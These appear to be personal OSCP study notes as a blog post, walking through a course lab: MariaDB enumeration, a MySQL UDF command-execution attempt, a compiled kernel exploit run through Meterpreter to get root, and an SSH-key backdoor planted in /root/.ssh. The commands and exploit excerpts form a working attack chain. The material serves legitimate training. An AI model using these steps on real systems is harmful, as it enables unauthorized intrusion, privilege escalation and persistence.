---
layout: post
title:  "OSCP Origin Part 24_3"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Assembling the Pieces of Penetration Testing"
toc: true
comments: false
rating: 3.5
---

Assembling the Pieces of Penetration Testing

## Targeting the database

- Web applications frequently have a database configured on another server as is the case in sandbox.local.

-       However, at this point we have network access to the database host and, for the most part, we can treat it as if we are on the same network. 

-       As is always the case with tunnels, we should expect some lag.

## Enumerating the database

-  Becauseof access to the WordPress server, we know that the host is in a different network than we are currently on. 

-  We also know that we are running MariaDB version 10.3.20. 

-  A quick Google search shows us this is a fairly new version. 

-  **This presents a problem as a new version most likely won’thave vulnerabilities that lead to remote code execution.  **
  
- **Let’s connect to the database and start enumerating other aspects of MariaDB**

# Attempting to exploit the database
- modify shell code and attempt to execute higher level shell access.

- but failed because it needs root privileges to do commands such as select , insert , delete, update and delete.


---
---

- While the individual commands give us no reason for concern, we have no idea what the shellcodeis doing. 
   
   - Instead, we will replace the shellcode with something that we are in control of.
   
   -   The references in the exploit state that raptor_udf.c was used. 
   
   -   A quick Google search reveals a relevant  
	
- Exploit Database entry 733 and a note at the bottom of the comments mentions a GitHub project734 that looks very promising.

```bash
kali@kali:~$ git clone https://github.com/mysqludf/lib_mysqludf_sys.git
Cloning into 'lib_mysqludf_sys'...
...
kali@kali:~$ cd lib_mysqludf_sys/
kali@kali:~/lib_mysqludf_sys$ 
```

- Opening up the l**ib_mysqludf_sys.c** file shows us a fairly standard **UDF library that allows for execution of system commands through the C/C++ system function.**

```bash
...
my_ulonglong sys_exec(
 UDF_INIT *initid
, UDF_ARGS *args
, char *is_null
, char *error
){
 return system(args->args[0]);
}
...
```

-    Moreover, according to the code, the function exported by the shared library after compilation is named sys\_exec as in the previous exploit.
   
-    We’ll need to create a MySQL function with the same name in order to execute system commands from the database

-    Now that we have reviewed the code, we will compile the shared library.

-    Looking at the** install.sh** file, as a prerequisite for compilation we need to install **libmysqlclient15-dev**. 

-    In Kali Linux, this is the **default-libmysqlclient-dev package**, **which can be installed with apt**

```bash
kali@kali:~/lib_mysqludf_sys$ sudo apt update && sudo apt install default-libmysqlclie
nt-dev
```

- we have the dependencies installed, we need to remove the old object  file before generating the new one.

```bash
kali@kali:~/lib_mysqludf_sys$ rm lib_mysqludf_sys.so 
```

-    Looking at the Makefile, we will need to make some minor adjustments to ensure we can compile the source file correctly.

```bash
LIBDIR=/usr/lib
install:
 gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o $(LIBDIR)/lib
_mysqludf_sys.so
```

-    Specifically we need to adjust the include directory path for the gcc command since we have a MariaDB **installation on our Kali system and not a MySQL one.** 

-    The changes to the Makefile are shown in Listing

```bash
kali@kali:~/lib_mysqludf_sys$ </span>cat Makefile</span>
LIBDIR=/usr/lib
install:
 gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include
/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so

kali@kali:~/lib_mysqludf_sys$ make
gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb
/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so
```

-    The** -Wall flag enables all of gcc’s warning messages and -I includes the directory of header files.**

-    The list included in the command found in Listing 914 are common locations for header files forMariaDB. 

-    The **-shared flag tells gcc this is a shared library and to generate a shared object file**.

-    Finally, **-o tells gcc where to output the file**.

-    Recalling the **SQL commands from the UDF exploit,** to **transfer the shared library to the target database server, we will need the file as a hexdump**

```bash
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

-    To do so we can use the following command:

```bash
kali@kali:~/lib_mysqludf_sys$ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_s
ys.so.hex
```

-    The** xxd command is used to make the hexdump **and the ** -p flag outputs a plain hexdump,** whichmakes it easier for further manipulation. 

-    We use **tr to delete the new line character and then dump the contents of the output to a file named lib\_mysqludf\_sys.so.hex.**

   - The contents of the lib\_mysqludf\_sys.so.hex file is what we will use for shellcode.  
  
- We have everything that we need to attempt to exploit Zora. 

- Now we just need to put it together.Before we begin running the malicious SQL commands, we will create a variable in MariaDB for the shellcode. 

- The contents of this variable are obtained from the lib\_mysqludf\_sys.so.hex file.

```sql
MariaDB [(none)]> set @shell = 0x7f454c4602010100000000000000000003003e000100000000110
000000000004000000000000000e03b0000000000000000000040003800090040001c001b0001000000040
00000000000...00000000000000000000;
```

   - Note the **addition of “0x” to the beginning of the shellcode and the lack of single or double quotes**.
   
   - This is necessary for MariaDB to read the text as binary.
   
   -   Next, per the exploit instructions, we will confirm the location of the plugin directory.
	
```sql
MariaDB [(none)]> select @@plugin_dir;
+-------------------+
| @@plugin_dir |
+-------------------+
| /home/dev/plugin/ |
+-------------------+
1 row in set (0.072 sec)
```

  - As expected, the plugin directory is in **/home/dev/plugin/.**
  
  -   Next, we need to output the shellcode to a file on Zora. 
     
  -   The original exploit generates a random filename for this, but we can name it whatever we want. 
  
  -   The command in Listing 919 tells MariaDB to treat the contents of the **@shellvariable as binary and to output it to the /home/dev/plugin/udf\_sys\_exec.so file.**
	
```sql
MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so
';
ERROR 1045 (28000): Access denied for user 'wp'@'%' (using password: YES)
MariaDB [(none)]>
```

  - Unfortunately, this is where we encounter our first problem. 
  
  - According to the error message above,the wp user does not have permissions to create files.

##  Why We Failed

- While the user does have permissions to run SELECT, INSERT, UPDATE, and DELETE, the wp user is missing the FILE permissions to be allowed to run dumpfile. 

 - **To run dumpfile we need a user account with a higher level of permissions, such as the root user**. 
 
 - Without this, **we are stuck and cannot move forward with exploiting Zora using the current approach**. 
 
 - **The first logical option that comes to mind is to go back to Ajla and see if we can find root (or similar) MariaDB credentials**.

## Application service enumeration

### Summary
- Enumerate application 
- find exploit using searchsploit for sql which is used in mariadb
- exploit user defined function used to get privilege in host system
- which uses shell code to execute in the system to get privileges
---
---
-    To connect to MariaDB, we can use **Kali’s built in MySQL client along with the credentials we have recovered from the WordPress configuration file**

-    MariaDB is a different package than MySQL,it was designed to be backwards compatible

-    We will also need to point the MySQL client to the tunnel running on Kali on port 13306

```bash
kali@kali:~$ mysql --host=127.0.0.1 --port=13306 --user=wp -p
Enter password:
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]>
```

-    we are connected, **we can look at what privileges we have as the wp user and get a better idea of how this MariaDB instance is configured**

```bash
MariaDB [(none)]> SHOW Grants;
+------------------------------------------------------------------------------------+
| Grants for wp@% |
+------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'wp'@'%' IDENTIFIED BY PASSWORD '*61163AE4B131AB0E43F07BE7B' |
| GRANT SELECT, INSERT, UPDATE, DELETE ON `wordpress`.* TO 'wp'@'%' |
+------------------------------------------------------------------------------------+
2 rows in set (0.075 sec)
```

-    We don’t have "\*" permissions, but SELECT, INSERT, UPDATE, and DELETE are a good starting point

-    let’s take a look at some variables and see if we can find anything that stands out.

```bash
MariaDB [(none)]> show variables;
+------------------------------------------+--------------------------------------+
| Variable_name | Value |
+------------------------------------------+--------------------------------------+
| alter_algorithm | DEFAULT |
| aria_block_size | 8192 |
| aria_checkpoint_interval | 30 |
...
| hostname | zora |
| identity | 0 |
...
| pid_file | /run/mysqld/mariadb.pid |
| plugin_dir | /home/dev/plugin/ |
| plugin_maturity | gamma |
| port | 3306 |
| preload_buffer_size | 32768 |
| profiling | OFF |
...
| tmp_memory_table_size | 16777216 |
| tmp_table_size | 16777216 |
| tmpdir | /var/tmp |
| transaction_alloc_block_size | 8192 |
...
| userstat | OFF |
| version | 10.3.20-MariaDB |
| version_comment | MariaDB Server |
| version_compile_machine | x86_64 |
| version_compile_os | Linux |
| version_malloc_library | system |
...
| wsrep\_sst\_receive\_address | AUTO |  
| wsrep\_start\_position | 00000000-0000-0000-0000-000000000000:|  
| wsrep\_sync\_wait | 0 |  
+------------------------------------------+--------------------------------------+  
639 rows in set (0.154 sec)
```

-    From this one query we learned a few things

-    we found that the hostname is “zora”

-    From this point on, we will refer to the MariaDB host as Zora

-    we also learned that the **tmp directory is in /var/tmp**

-    We also confirm again that we are running MariaDB version 10.3.20 but we now also learn that the target architecture is x86\_64

-  **  The most interesting piece of information we can gatheris that the plugin\_dir is set to /home/dev/plugin/**

-    This directory is not standard for MariaDB. Let’stake note of that as it might become useful later on.

-    Now that we have gathered some information, let’s see if we can find any exploits for our targetMariaDB version.

```bash
kali@kali:~$ searchsploit mariadb
------------------------------------------------------ -------------------------------
Exploit Title | Path (/usr/share/exploitdb/)
------------------------------------------------------ -------------------------------
MariaDB Client 10.1.26 - Denial of Service (PoC) | exploits/linux/dos/45901.txt
MySQL / MariaDB - Geometry Query Denial of Service | exploits/linux/dos/38392.txt
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Co | exploits/linux/local/40360.txt
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysq | exploits/linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root | exploits/linux/local/40679.sh
Oracle MySQL / MariaDB - Insecure Salt Generation Sec | exploits/linux/remote/38109.pl
------------------------------------------------------------------ -------------------
Shellcodes: No Result
Papers: No Result
```

-    Unfortunately, none of these would work for our version of MariaDB.

-    Let’s broaden the scope and see what we get for MySQL.

```bash
kali@kali:~$ searchsploit mysql  
\---------------------------------------------------- ---------------------------------  
Exploit Title | Path (/usr/share/exploitdb/)  
\---------------------------------------------------- ---------------------------------  
...  
MySQL (Linux) - Database Privilege Escalation | exploits/linux/local/23077.pl  
MySQL (Linux) - Heap Overrun (PoC) | exploits/linux/dos/23076.pl  
MySQL (Linux) - Stack Buffer Overrun (PoC) | exploits/linux/dos/23075.pl  
...  
MySQL 3.x/4.x - ALTER TABLE/RENAME Forces Old Permi | exploits/linux/remote/24669.txt  
MySQL 4.0.17 (Linux) - User-Defined Function (U | exploits/linux/local/1181.c  
MySQL 4.1.18/5.0.20 - Local/Remote Information Leak | exploits/linux/remote/1742.c  
MySQL 4.1/5.0 - Authentication Bypass | exploits/multiple/remote/24250.p  
l  
MySQL 4.1/5.0 - Zero-Length Password Authentication | exploits/multiple/remote/311.pl  
MySQL 4.x - CREATE FUNCTION Arbitrary libc Code Exe | exploits/multiple/remote/25209.p  
l  
MySQL 4.x - CREATE FUNCTION mysql.func Table Arbitr | exploits/multiple/remote/25210.p  
hp
MySQL 4.x - CREATE Temporary TABLE Symlink Privileg | exploits/multiple/remote/25211.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) | exploits/linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function Com | exploits/windows/remote/3274.txt
MySQL 4.x/5.x - Server Date_Format Denial of Servic | exploits/linux/dos/28234.txt
MySQL 4/5 - SUID Routine Miscalculation Arbitrary D | exploits/linux/remote/28398.txt
MySQL 4/5/6 - UDF for Command Execution | exploits/linux/local/7856.txt
MySQL 5 - Command Line Client HTML Special Characte | exploits/linux/remote/32445.txt
MySQL 5.0.18 - Query Logging Bypass | exploits/linux/remote/27326.txt
...
MySQL Squid Access Report 2.1.4 - HTML Injection | exploits/php/webapps/20055.txt
MySQL Squid Access Report 2.1.4 - SQL Injection / C | exploits/php/webapps/44483.txt
MySQL User-Defined (Linux) (x32/x86_64) - 'sys_ | exploits/linux/local/46249.py
MySQL yaSSL (Linux) - SSL Hello Message Buffer Over | exploits/linux/remote/16849.rb
MySQL yaSSL (Windows) - SSL Hello Message Buffer Ov | exploits/windows/remote/16701.rb
...
-------------------------------------- -----------------------------------------------
Paper Title | Path (/usr/share/exploitdb-papers
-------------------------------------- -----------------------------------------------
...
MySQL Session Hijacking over RFI | docs/english/13708-mysql-session-hijacking-ove
MySQL UDF Exploitation | docs/english/44139-mysql-udf-exploitation.pdf
MySQL: Secure Web Apps - SQL Injectio | papers/english/12945-mysql-secure-web-apps---s
Novel contributions to the field - Ho | docs/english/40143-novel-contributions-to-the-
...
----------------------------------------------------------- --------------------------
```

-    When searching for MySQL vulnerabilities, we have to change our approach a bit.

-    This time we are not looking for an exact version number that might be vulnerable to an exploit since MariaDB and MySQL use different version numbers.

-    Instead, we are trying to see if we can identify a pattern in publicly disclosed exploits that may indicate a type of attack we could use.

-    **We notice that the words “UDF” and “User Defined” show up often.**

-    Let’s take a look at a more recent UDF exploit found in **/usr/share/exploitdb/exploits/linux/local/46249.py**.

```bash
1 # Exploit Title: MySQL User-Defined (Linux) x32 / x86\_64 sys\_exec function local pr  
ivilege escalation exploit  
2 # Date: 24/01/2019  
3 ...  
19 References:  
20 https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html  
21 https://www.exploit-db.com/exploits/1518  
22 https://www.exploit-db.com/papers/44139/ - MySQL UDF Exploitation by Osanda Malith  
Jayathissa (@OsandaMalith)
```

-    The exploit begins by referencing other research into UDF exploitation including a paper written on the subject.

-    Reviewing this paper teaches us that a User Defined Function (UDF) is similar to a custom plugin for MySQL.

-    It allows database administrators to create custom repeatable functions to accomplish specific objectives.

-    Conveniently for us, UDFs are written in C or C++ 731 and can run almost anycode we want, including system commands.

-    Researchers have discovered how to use standard MySQL (and MariaDB) functionality to create these plugins in ways that can be used to exploit systems.

-    This specific exploit discusses using UDFs as ways to escalate privileges on a host.
-    However, we should be able to use the same principle to get an initial shell.
-    Some modifications will be required but before we start changing anything, let’s take a look at the code

```bash
40 shellcode_x32 = "7f454c4601010100000000000000000...";
41 shellcode_x64 = "7f454c4602010100000000000000000...";
42
43 shellcode = shellcode_x32
44 if (platform.architecture()[0] == '64bit'):
45 shellcode = shellcode_x64
...
71 cmd='mysql -u root -p\'' + password + '\' -e "select @@plugin_dir \G"'
72 plugin_str = subprocess.check_output(cmd, shell=True)
73 plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
74 res = bool(plugin_dir)
...
91 print "Trying to create a udf library...";
92 os.system('mysql -u root -p\'' + password + '\' -e "select binary 0x' + shellcode
+ ' into dumpfile \'%s\' \G"' % udf_outfile)
93 res = os.path.isfile(udf_outfile)
...
99 print "UDF library crated successfully: %s" % udf_outfile;
100 print "Trying to create sys_exec..."
101 os.system('mysql -u root -p\'' + password + '\' -e "create function sys_exec retu
rns int soname \'%s\'\G"' % udf_filename)
102
103 print "Checking if sys_exec was crated..."
104 cmd='mysql -u root -p\'' + password + '\' -e "select * from mysql.func where name
=\'sys_exec\' \G"';
105 res = subprocess.check_output(cmd, shell=True);
...
110 if res:
111 print "sys_exec was found: %s" % res
112 print "Generating a suid binary in /tmp/sh..."
113 os.system('mysql -u root -p\'' + password + '\' -e "select sys_exec(\'cp
/bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\')"')
114
115 print "Trying to spawn a root shell..."
116 pty.spawn("/tmp/sh");
```

-    The first thing we notice is a** shellcode variable defined on lines 40-45**.

-    The SQL query at line 71 obtains the plugin directory (remember this is the variable that we found was not standard on Zora).

-    Next, on line 92, the code dumps the shellcode binary content into a file within the plugin directory.

-    Line 101 creates a function named sys\_exec leveraging the uploaded binary file.

   - Finally, the script checks if the function was successfully created on line 104 and if this is the case, the function is executed on line 113.  
  
- Reading a bit more about the MySQL CREATE FUNCTION syntax 732 suggeststhat the binary content of the shellcode variable is supposed to be a shared library that implements and exports the function(s) we want to create within the database.  
  
- Essentially, this entire script is only running five commands. If we trim down the code to its essentialMySQL commands, we obtain the following:

```sql
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

-    **we already have an interactive MariaDB shell**, **we could theoretically run these commands directly in the MariaDB shell against Zora**.

- ** we want to make sure we understand what we are about to execute before proceeding**.

> refer [[shell code | how shell code works]]

## Deeper Enumeration of the Web Application Server

### Summary
- doesnot find any credentials in mariadb
- attempt to exploit kernel
- from searchspolit find some vulnerabilities to exploit.
---
---

- During this round of enumeration, our goal is to find something that **will give us higher levels of access to Zora’s MariaDB service.**

-   While we could continue **trying to enumerate Ajla with our current user, www-data, we believe that a higher level of permissions would be very helpful. **

-   This is why we will first concentrate our enumeration efforts on privilege escalation, then we will move on to looking for credentials. 
 
-  To look for a privilege escalation vector, we will need to go back to our Meterpreter Shell on Ajla.

## More Thorough Post Exploitation

- Previously, we learned that **Ajla is running on Ubuntu 16.04, **which is a fairly recent version. 

- This means that the chance of finding a kernel exploit will be smaller than in an older version. 

- However, we shouldn’t totally rule out the possibility. 

- After enumerating running processes, system services, and installed applications, we find that other than the WordPress install, the** Ubuntu server seems to run only default services and applications.** 

- **This does not look promising. To complete the applications and services assessment we run netstat to determine what other ports might be open.**

```bash
meterpreter > shell
Process 6792 created.
Channel 3 created.
netstat -tulpn
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -
tcp6 0 0 :::80 :::* LISTEN -
tcp6 0 0 :::22 :::* LISTEN -
udp 0 0 0.0.0.0:67 0.0.0.0:*
```

- Unfortunately, the output in Listing 920 doesn’t reveal anything interesting either. 

- At this point, it is a good idea to start looking at kernel exploits.

-   But first we need to find out which kernel version our target is running.

```bash
uname -a
Linux ajla 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64
x86_64 GNU/Linux
```

- Now that we have the kernel version, we will return to searchsploit.

```bash
kali@kali:~$ searchsploit ubuntu 16.04
...
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PA | exploits/linux_x86-64/local/
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | exploits/linux_x86-64/local/
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x8 | exploits/linux/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bp | exploits/linux/local/39772.t
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPL | exploits/linux/local/40489.t
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Poin | exploits/linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loca | exploits/linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privi | exploits/linux/local/44298.c
...
```

- While many of these seem like they might work, one in particular grabs our attention. 

- After reviewing the source code for exploit 45010,737 we see that it is well written, was tested against several different kernel versions, and has great instructions on compiling and executing. 

- First, let’s find out if Ajla has gcc.

> The kernel versions don’t always have to match exactly for an exploit to work. In this case, the exploit was tested with kernel 4.13.9, which is more recent than the kernel on Ajla.

```bash
gcc
/bin/sh: 1: gcc: not found
find / -name gcc -type f 2>/dev/null
/usr/share/bash-completion/completions/gcc
```

- Unfortunately, Ajla does not have the gcc binary installed **so we will need to compile the exploit on our Kali machine, transfer it to Ajla, and hope that it will still work. **

- **Alternatively and if necessary, we could also create a virtual machine that is identical to our target system relative to the OS and kernel versions and compile the exploit on it**.

## Privilege Escalation

First, we will copy the exploit to our home directory so we don’t alter the original version. Once the copy is made, we will follow the compile instructions in the file.

```bash
kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
kali@kali:~$ gcc 45010.c -o 45010
kali@kali:~$ 
```

- The exploit compiled without errors so we will use meterpreter to upload it to Ajla.

```bash
meterpreter > upload /home/kali/45010 /tmp/
[*] uploading : /home/kali/45010 -> /tmp/
[*] uploaded : /home/kali/45010 -> /tmp//45010
```

- Finally, it’s time to run the exploit against Ajla.

```bash
meterpreter > shell 
Process 1546 created.
Channel 5 created.
cd /tmp
chmod +x 45010
./45010
whoami
root
```

- In Listing 926, the exploit does not give us any output but running whoami tells us that we are now running as the root user.

-   **Now that we have root access**, we can create a **more stable backdoor using ssh**. This will allow us to come back to Ajla even if our meterpreter session dies.

- First, we need to **generate a new ssh key on our Kali machine.**

> If you already have ssh keys generated, feel free to skip this step.

```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_rsa.
Your public key has been saved in /home/kali/.ssh/id_rsa.pub.
...
kali@kali:~$ cat:~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali
```

- With our ssh key generated, we can create the authorized\_keys file on Ajla to accept our public key. 

- We will do this via the meterpreter session that has the root shell.

```bash
mkdir /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_ke
ys
```

- Now on Kali, we can use the ssh client to connect to Ajla directly.

```bash
kali@kali:~$ ssh root@sandbox.local
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
...
root@ajla:~#
```

